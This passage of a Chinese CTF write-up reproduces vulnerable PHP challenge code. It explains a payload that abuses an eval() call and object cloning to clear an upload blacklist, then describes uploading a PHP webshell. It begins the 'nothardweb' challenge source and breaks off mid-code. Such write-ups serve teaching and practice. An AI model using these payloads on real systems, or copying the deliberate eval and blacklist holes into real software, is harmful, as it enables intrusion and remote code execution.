+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span> <span class=nx>session_start</span><span class=p>();</span><span class=nx>ob_start</span><span class=p>();</span><span class=cp>?&gt;</span>
+<span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;Content-Security-Policy&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;style-src &#39;self&#39;; script-src &#39;unsafe-inline&#39; http://</span><span class=cp>&lt;?</span><span class=o>=</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_HOST&#39;</span><span class=p>]</span><span class=cp>?&gt;</span><span class=s>/; object-src &#39;none&#39;; frame-src &#39;self&#39;&#34;</span><span class=p>&gt;</span>
+<span class=cp>&lt;?php</span>
+<span class=c1>// error_reporting(0);
+</span><span class=c1>// 真男人从来不关报错
+</span><span class=c1></span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+<span class=c1>// 哎真香真香
+</span><span class=c1></span>
+<span class=k>class</span> <span class=nc>User</span><span class=p>{</span>
+
+	<span class=k>public</span> <span class=nv>$info</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$uploader</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$url</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$asker</span><span class=p>;</span>
+
+	<span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$name</span><span class=p>){</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>info</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Info</span><span class=p>(</span><span class=nv>$name</span><span class=p>);</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>uploader</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uploader</span><span class=p>();</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>url</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>UrlHelper</span><span class=p>();</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>asker</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Asker</span><span class=p>();</span>
+	<span class=p>}</span>
+    
+    <span class=o>...</span><span class=p>(</span><span class=nx>省略非关键代码</span><span class=p>)</span>
+
+	<span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+		<span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$this</span><span class=p>);</span>
+	<span class=p>}</span>
+
+<span class=p>}</span>
+
+<span class=o>...</span><span class=p>(</span><span class=nx>省略非关键代码</span><span class=p>)</span>
+
+<span class=k>class</span> <span class=nc>Uploader</span><span class=p>{</span>
+
+	<span class=k>public</span> <span class=nv>$flag</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$file</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$ext</span><span class=p>;</span>
+
+	<span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>flag</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>black_list</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;ph&#39;</span><span class=p>,</span> <span class=s1>&#39;ht&#39;</span><span class=p>,</span> <span class=s1>&#39;sh&#39;</span><span class=p>,</span> <span class=s1>&#39;pe&#39;</span><span class=p>,</span> <span class=s1>&#39;j&#39;</span><span class=p>,</span> <span class=s1>&#39;=&#39;</span><span class=p>,</span> <span class=s1>&#39;co&#39;</span><span class=p>,</span> <span class=s1>&#39;\\&#39;</span><span class=p>,</span> <span class=s1>&#39;&#34;&#39;</span><span class=p>,</span> <span class=s1>&#39;\&#39;&#39;</span><span class=p>];</span>
+	<span class=p>}</span>
+
+	<span class=k>function</span> <span class=nf>check</span><span class=p>(){</span>
+		<span class=nv>$ext</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>],</span> <span class=nx>strpos</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>],</span> <span class=s1>&#39;.&#39;</span><span class=p>));</span>
+		<span class=nv>$reg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+		<span class=k>foreach</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>black_list</span> <span class=k>as</span> <span class=nv>$key</span><span class=p>)</span> <span class=p>{</span>
+			<span class=nv>$reg</span> <span class=o>.=</span> <span class=nv>$key</span> <span class=o>.</span> <span class=s2>&#34;|&#34;</span><span class=p>;</span>
+		<span class=p>}</span>
+		<span class=nv>$reg</span> <span class=o>=</span> <span class=s2>&#34;/&#34;</span> <span class=o>.</span> <span class=nv>$reg</span> <span class=o>.</span> <span class=s2>&#34;\x|\s|[</span><span class=se>\x01</span><span class=s2>-</span><span class=se>\x20</span><span class=s2>]/i&#34;</span><span class=p>;</span>
+		<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=nv>$reg</span><span class=p>,</span> <span class=nv>$ext</span><span class=p>,</span> <span class=nv>$mathches</span><span class=p>)){</span>
+			<span class=c1>// echo &#34;Nope!&#34;;
+</span><span class=c1></span>			<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+		<span class=p>}</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ext</span> <span class=o>=</span> <span class=nv>$ext</span><span class=p>;</span>
+	<span class=p>}</span>
+
+	<span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>flag</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+	<span class=p>}</span>
+
+	<span class=k>function</span> <span class=nf>upload</span><span class=p>(){</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>check</span><span class=p>();</span>
+		<span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>flag</span><span class=p>){</span>
+			<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>
+				<span class=k>if</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;error&#34;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>){</span>
+					<span class=k>echo</span> <span class=s2>&#34;Error: &#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;error&#34;</span><span class=p>];</span>
+				<span class=p>}</span>
+				<span class=k>else</span><span class=p>{</span>
+					<span class=k>if</span> <span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=s2>&#34;upload/&#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>])){</span>
+						<span class=k>echo</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34; already exists. &#34;</span><span class=p>;</span>
+					<span class=p>}</span>
+					<span class=k>else</span><span class=p>{</span>
+						<span class=k>if</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;size&#34;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>10240</span><span class=p>){</span>
+							<span class=k>echo</span> <span class=s2>&#34;you are too big ⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄&#34;</span><span class=p>;</span>
+						<span class=p>}</span>
+						<span class=k>else</span><span class=p>{</span>
+							<span class=nv>$new_addr</span> <span class=o>=</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;DOCUMENT_ROOT&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;/upload/&#34;</span> <span class=o>.</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>])</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ext</span><span class=p>;</span>
+							<span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>],</span> <span class=nv>$new_addr</span><span class=p>);</span>
+							<span class=k>return</span> <span class=nv>$new_addr</span><span class=p>;</span>
+						<span class=p>}</span>
+					<span class=p>}</span>
+				<span class=p>}</span>
+			<span class=p>}</span>
+		<span class=p>}</span>
+		<span class=k>else</span><span class=p>{</span>
+			<span class=k>die</span><span class=p>(</span><span class=s2>&#34;?&#34;</span><span class=p>);</span>
+		<span class=p>}</span>
+	<span class=p>}</span>
+<span class=p>}</span>
+
+<span class=k>class</span> <span class=nc>Asker</span><span class=p>{</span>
+
+	<span class=k>public</span> <span class=nv>$question</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$right</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$answer</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$times</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$A</span> <span class=o>=</span> <span class=k>True</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$B</span> <span class=o>=</span> <span class=k>True</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$C</span> <span class=o>=</span> <span class=k>True</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$D</span> <span class=o>=</span> <span class=k>True</span><span class=p>;</span>
+	<span class=k>public</span> <span class=nv>$message</span> <span class=o>=</span> <span class=s2>&#34;大郎快醒醒，老师叫你回答问题啦！&#34;</span><span class=p>;</span>
+
+	<span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>question</span> <span class=o>=</span> <span class=s2>&#34;what is your problem?&#34;</span><span class=p>;</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>right</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span><span class=p>;</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>answer_list</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;A&#39;</span><span class=p>,</span> <span class=s1>&#39;B&#39;</span><span class=p>,</span> <span class=s1>&#39;C&#39;</span><span class=p>,</span> <span class=s1>&#39;D&#39;</span><span class=p>];</span>
+	<span class=p>}</span>
+
+	<span class=o>...</span><span class=p>(</span><span class=nx>省略非关键代码</span><span class=p>)</span>
+	
+	<span class=k>function</span> <span class=nf>updateList</span><span class=p>(){</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>answer_list</span> <span class=o>=</span> <span class=p>[];</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>A</span> <span class=o>?</span> <span class=nx>array_push</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>answer_list</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>B</span> <span class=o>?</span> <span class=nx>array_push</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>answer_list</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>C</span> <span class=o>?</span> <span class=nx>array_push</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>answer_list</span><span class=p>,</span> <span class=s2>&#34;C&#34;</span><span class=p>)</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>D</span> <span class=o>?</span> <span class=nx>array_push</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>answer_list</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>message</span> <span class=o>=</span> <span class=s2>&#34;这都能答错，再给你一次机会！&#34;</span><span class=p>;</span>
+	<span class=p>}</span>
+
+	<span class=k>function</span> <span class=nf>answer</span><span class=p>(</span><span class=nv>$user</span><span class=p>,</span> <span class=nv>$answer</span><span class=p>){</span>
+		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>user</span> <span class=o>=</span> <span class=k>clone</span> <span class=nv>$user</span><span class=p>;</span>
+		<span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>right</span> <span class=o>==</span> <span class=nv>$answer</span><span class=p>){</span>
+			<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>message</span> <span class=o>=</span> <span class=s2>&#34;clever man!&#34;</span><span class=p>;</span>
+			<span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+		<span class=p>}</span>
+		<span class=k>else</span><span class=p>{</span>
+			<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/[^a-zA-Z_\-}&gt;@\]*]/i&#34;</span><span class=p>,</span> <span class=nv>$answer</span><span class=p>)){</span>
+				<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>message</span> <span class=o>=</span> <span class=s2>&#34;no no no&#34;</span><span class=p>;</span>
+			<span class=p>}</span>
+			<span class=k>else</span><span class=p>{</span>
+				<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/f|sy|and|or|j|sc|in/i&#39;</span><span class=p>,</span> <span class=nv>$answer</span><span class=p>)){</span>
+					<span class=c1>// Big Tree 说这个正则不需要绕
+</span><span class=c1></span>					<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>message</span> <span class=o>=</span> <span class=s2>&#34;what are you doing bro?&#34;</span><span class=p>;</span>
+				<span class=p>}</span>
+				<span class=k>else</span><span class=p>{</span>
+					<span class=k>eval</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\$</span><span class=s2>this-&gt;&#34;</span><span class=o>.</span><span class=nv>$answer</span><span class=o>.</span><span class=s2>&#34; = false;&#34;</span><span class=p>);</span>
+					<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>updateList</span><span class=p>();</span>
+				<span class=p>}</span>
+			<span class=p>}</span>
+			<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>times</span> <span class=o>++</span><span class=p>;</span>
+			<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+		<span class=p>}</span>
+	<span class=p>}</span>
+
+	<span class=o>...</span><span class=p>(</span><span class=nx>省略非关键代码</span><span class=p>)</span>
+<span class=p>}</span>
+
+<span class=o>...</span><span class=p>(</span><span class=nx>省略非关键代码</span><span class=p>)</span>
+
+</code></pre></td></tr></table></div></div><p>可以发现User类里的<code>$this->uploader = new Uploader();</code>此uploader对象是引用值，当answer方法里clone后的新user对象<code>$user -> uploader -> back_list</code>值发生改变时，会影响原user<code>$user -> uploader -> back_list</code>的值</p><p>我们使用payload<code>/quiz.php?answer=user->uploader->black_list</code>会导致<code>eval("\$this->user->uploader->black_list = false;");</code>清空上传后缀黑名单，随后受影响的user对象会存入session中。</p><p>由于实现上传功能里有这么一段代码，会导致从session中加载我们清空黑名单后的uploader，导致任意文件上传，后面就是上传无情的php一句话，然后拿flag了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+<span class=k>require_once</span><span class=p>(</span><span class=s2>&#34;lib.php&#34;</span><span class=p>);</span>
+<span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>])){</span>
+    <span class=nv>$user</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>User</span><span class=p>(</span><span class=s2>&#34;no!&#34;</span><span class=p>);</span>
+    <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>url</span><span class=o>-&gt;</span><span class=na>jump</span><span class=p>(</span><span class=s2>&#34;login&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+<span class=k>else</span><span class=p>{</span>
+    <span class=nv>$user</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]);</span>
+    <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>url</span><span class=o>-&gt;</span><span class=na>flag</span> <span class=o>=</span> <span class=k>False</span><span class=p>;</span>
+    <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>url</span><span class=o>-&gt;</span><span class=na>page</span> <span class=o>=</span> <span class=s2>&#34;customlize&#34;</span><span class=p>;</span>
+<span class=p>}</span>
+<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>
+    <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>upload</span><span class=p>();</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div><p><figure><a class=lightgallery href=image-20200309043400782.png title=image-20200309043400782 data-thumbnail=image-20200309043400782.png><img class=lazyload src=/svg/loading.min.svg data-sizes=auto data-srcset="image-20200309043400782.png, image-20200309043400782.png 1.5x, image-20200309043400782.png 2x" data-src=image-20200309043400782.png alt=image-20200309043400782></a><figcaption class=image-caption>image-20200309043400782</figcaption></figure></p><h3 id=nothardweb>nothardweb</h3><h4 id=外网机>外网机</h4><p>user.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+<span class=k>class</span> <span class=nc>User</span><span class=p>{</span>
+    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>
+    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$username</span><span class=p>)</span>
+    <span class=p>{</span>
+        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span> <span class=o>=</span> <span class=nv>$username</span><span class=p>;</span>
+    <span class=p>}</span>
+    <span class=k>function</span> <span class=nf>show</span><span class=p>(){</span>
+        <span class=k>return</span> <span class=s2>&#34;username: </span><span class=si>$this-&gt;username\n</span><span class=s2>&#34;</span><span class=p>;</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+</code></pre></td></tr></table></div></div><p>index.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+    <span class=nx>session_start</span><span class=p>();</span>
+    <span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+    <span class=k>include</span> <span class=s2>&#34;user.php&#34;</span><span class=p>;</span>
+    <span class=k>include</span> <span class=s2>&#34;conn.php&#34;</span><span class=p>;</span>
+    <span class=nv>$IV</span> <span class=o>=</span> <span class=s2>&#34;********&#34;</span><span class=p>;</span><span class=c1>// you cant know that;
+</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;hash&#39;</span><span class=p>])){</span>
+        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>])){</span>
+            <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>strval</span><span class=p>(</span><span class=nx>mt_rand</span><span class=p>()</span> <span class=o>&amp;</span> <span class=mh>0x5f5e0ff</span><span class=p>);</span>
+            <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;iv&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$IV</span><span class=p>;</span>
+        <span class=p>}</span>
+        <span class=nv>$username</span> <span class=o>=</span> <span class=s2>&#34;guest&#34;</span><span class=p>;</span>
+        <span class=nv>$o</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>User</span><span class=p>(</span><span class=nv>$username</span><span class=p>);</span>
+        <span class=k>echo</span> <span class=nv>$o</span><span class=o>-&gt;</span><span class=na>show</span><span class=p>();</span>
+        <span class=nv>$ser_user</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$o</span><span class=p>);</span>
+        <span class=nv>$cipher</span> <span class=o>=</span> <span class=nx>openssl_encrypt</span><span class=p>(</span><span class=nv>$ser_user</span><span class=p>,</span> <span class=s2>&#34;des-cbc&#34;</span><span class=p>,</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>],</span> <span class=mi>0</span><span class=p>,</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;iv&#39;</span><span class=p>]);</span>
+        <span class=nx>setcookie</span><span class=p>(</span><span class=s2>&#34;user&#34;</span><span class=p>,</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$cipher</span><span class=p>),</span> <span class=nx>time</span><span class=p>()</span><span class=o>+</span><span class=mi>3600</span><span class=p>);</span>
+        <span class=nx>setcookie</span><span class=p>(</span><span class=s2>&#34;hash&#34;</span><span class=p>,</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$ser_user</span><span class=p>),</span> <span class=nx>time</span><span class=p>()</span> <span class=o>+</span> <span class=mi>3600</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=k>else</span><span class=p>{</span>
+        <span class=nv>$user</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]);</span>
+        <span class=nv>$uid</span> <span class=o>=</span> <span class=nx>openssl_decrypt</span><span class=p>(</span><span class=nv>$user</span><span class=p>,</span> <span class=s1>&#39;des-cbc&#39;</span><span class=p>,</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>],</span> <span class=mi>0</span><span class=p>,</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;iv&#39;</span><span class=p>]);</span>
+        <span class=k>if</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$uid</span><span class=p>)</span> <span class=o>!==</span> <span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;hash&#39;</span><span class=p>]){</span>
+            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;no hacker!&#34;</span><span class=p>);</span>
